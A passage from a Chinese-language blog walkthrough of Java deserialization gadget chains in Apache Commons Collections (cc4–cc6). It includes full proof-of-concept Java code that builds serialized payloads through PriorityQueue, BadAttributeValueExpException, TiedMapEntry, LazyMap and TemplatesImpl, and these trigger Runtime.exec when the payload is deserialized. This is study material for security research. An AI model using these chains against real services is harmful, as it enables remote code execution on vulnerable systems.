_comparator</span></span><br><span class="line">        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">        _comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _comparator.set(pq, iTransComparator);</span><br><span class="line">        <span class="comment">//解封属性queue，queueArray =&gt; _queue</span></span><br><span class="line">        Field _queue = PriorityQueue.class.getDeclaredField("queue");</span><br><span class="line">        _queue.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _queue.set(pq, queueArray);</span><br><span class="line">        <span class="comment">//size修改为2</span></span><br><span class="line">        Field _size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        _size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _size.set(pq, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc4_PriorityQueue.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc4_PriorityQueue.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里面在PriorityQueue处还可以有第二种写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">_comparator.set(pq, iTransComparator);</span><br></pre></td></tr></table></figure><p>第二种为什么只提前add了两下就可以了呢？</p><p>debug一下，看第一次add：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171058621.png" alt="image-20210516171058621"></p><p>size默认是0，所以这里属性queue[]已经赋值了第一个元素Integer(1)，size也被复制为1</p><p>第二次add：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171416672.png" alt="image-20210516171416672"></p><p>进到siftUp看一下，我们没有给comparator赋值，所以会进入else分支：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171513699.png" alt="image-20210516171513699"></p><p>siftUpComparator会将元素重新排序：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171612711.png" alt="image-20210516171612711"></p><p>两次add结束之后的状态：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171655090.png" alt="image-20210516171655090"></p><p>接下来解封comparator属性，包我们构造好的TransformingComparator借助反射赋值给它:</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171754309.png" alt="image-20210516171754309"></p><p>最终属性：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171933102.png" alt="image-20210516171933102"></p><p>话说回来，要是第一种，没有提前add两次赋值呢？</p><p>简短来说，那就是size和parator都没有赋值，只能再麻烦用反射去给size和queue赋值。</p><h2 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h2><p>条件：</p><ul><li><p><strong>commons-collections:3.1-3.2.1</strong></p></li><li><p><strong>jdk1.8</strong></p></li></ul><h3 id="利用链寻找-4"><a href="#利用链寻找-4" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以TiedMapEntry和BadAttributeValueExpException就被挖掘了出来。</p><p>先看cc中的TiedMapEntry的源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516200356238.png" alt="image-20210516200356238"></p><p>这里的map属性显然是可控的。</p><p>如果是我们熟悉的LazyMap就好了，这样就可以调用LazyMap.get方法进而触发Transformer的transform函数，执行调用链。</p><p>哪里可以调用TiedMapEntry的getValue呢？</p><p>TiedMapEntry的toString方法就可以</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516200813987.png" alt="image-20210516200813987"></p><p>那么有没有一个类可以在反序列化时触发 TiedMapEntry.toString() 呢？ BadAttributeValueExpException</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516201549257.png" alt="image-20210516201549257"></p><p>这里可以看到valObj也是从val属性拿到的，我们只要构造的时候把val属性设置为TiedMapEntry即可。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516202426352.png" alt="image-20210516202426352"></p><p>val是private，所以这里还是得用反射去构造。</p><h3 id="最终版本PoC-6"><a href="#最终版本PoC-6" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><p><strong>ver1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>慢点，这里既然提到了chain，我们可以模仿cc3来用InstantiateTransformer参与chain的构造，还有TrAXFilter：</p><p><strong>ver2</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain，封装进LazyMap</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazymap, <span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_InstantiateTransformer.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_InstantiateTransformer.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等一下，既然可以用TemplatesImpl，那么我们在cc2的TemplatesImpl版本中发现，TemplatesImpl的newTransformer会将自身的_bytecodes直接数组生成类对象，执行对象构造函数。</p><p>我们发现在TiedMapEntry的getValue中会将key参数传入，之后transform也会将key传递，所以这里我们还可以将tmpl传入TiedMapEntry的key属性，在最后也会被执行到。</p><p><strong>ver3</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造InvokerTransformer</span></span><br><span class="line">        InvokerTransformer iInvokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        <span class="comment">//InvokerTransformer iInvokerTransformer = new InvokerTransformer("getOutputProperties",new Class[]&#123;&#125;,new Object[]&#123;&#125;);也可以</span></span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,iInvokerTransformer);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazymap, tmpl);<span class="comment">//注意这里</span></span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_TemplatesImpl.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_TemplatesImpl.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>条件：</p><ul><li><p><strong>commons-collections:3.1-3.2.1</strong></p></li><li><p><strong>jdk1.7&amp;1.8</strong></p></li></ul><h3 id="利用链寻找-5"><a href="#利用链寻找-5" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>CC5 用了 BadAttributeValueExpException 反序列化去触发 LazyMap.get()，除了 BadAttributeValueExpException 、AnnotationInvocationHandler 还有其他方法吗？ ysoserial告诉我们HashMap也可以！</p><p>我们再看看TiedMapEntry的内部方法hashCode：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516212156876.png" alt="image-20210516212156876"></p><p>这里也调用了getValue！</p><p>如何反序列化时触发 TiedMapEntry.hashCode() ? </p><p>ysoserial发现了HashMap的readObject方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213000509.png" alt="image-20210516213000509"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213024813.png" alt="image-20210516213024813"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213038915.png" alt="image-20210516213038915"></p><p>调用了k.hashCode。</p><p>所以很容易想当然地构造出来一版PoC：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516221018615.png" alt="image-20210516221018615"></p><p>但是你会发现，<strong>在put操作处就会触发payload了，根本不是在readObject里面</strong>。</p><p>跟进去看看，这里面直接就触发了利用链，所以我们希望利用链触发在readObejct的位置。</p><p>如果想在readObject位置触发，跟几步发现，需要在LazyMap的get方法中让下面这个判断成立，才能进入transform：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516221822432.png" alt="image-20210516221822432"></p><p>这里面的map就是LazyMap，key就是123</p><p>我们当然希望返回值是false</p><p>继续跟进LazyMap的containsKey：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222703891.png" alt="image-20210516222703891"></p><p>希望getEntry(key)==null</p><p>继续跟进getEntry，这里面的key是123：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222727559.png" alt="image-20210516222727559"></p><p>这里可以看到，先有一个key是否为null的判断，<strong>123不为null所以执行了hash(key)</strong></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517095158842.png" alt="image-20210517095158842"></p><p>table是什么呢？</p><p>当我们第一次：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">hashMap.put(tmap, <span class="string">"test"</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517100233906.png" alt="image-20210517100233906"></p><p>虽然我们调用的是无参构造方法，但是这里会给我们安排到有参构造方法。</p><p><code>DEFAULT_INITIAL_CAPACITY = 16</code>进入有参构造方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517103659313.png" alt="image-20210517103659313"></p><p>这个table属于最外面的hashMap，他的长度为16</p><p>继续跟进到TiedMapEntry的get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517102800741.png" alt="image-20210517102800741"></p><p>这里面的map是LazyMap类的对象，也就是我们传进去的lazyMap</p><p>继续跟，来到LazyMap的get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517103044779.png" alt="image-20210517103044779"></p><p>这里面的map是我们传进去的innermap，也就是hashmap类型</p><p>跟进去看，</p><p>这里可以看到，先有一个key是否为null的判断，<strong>123不为null所以执行了hash(key)</strong></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517104830975.png" alt="image-20210517104830975"></p><p>所以这里e为null，返回null。成功会在put触发。</p><p>但是不要忘了put之后的状态：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517110138797.png" alt="image-20210517110138797"></p><p>lazymap.map就被放入了一个key，key的entry。</p><p><img 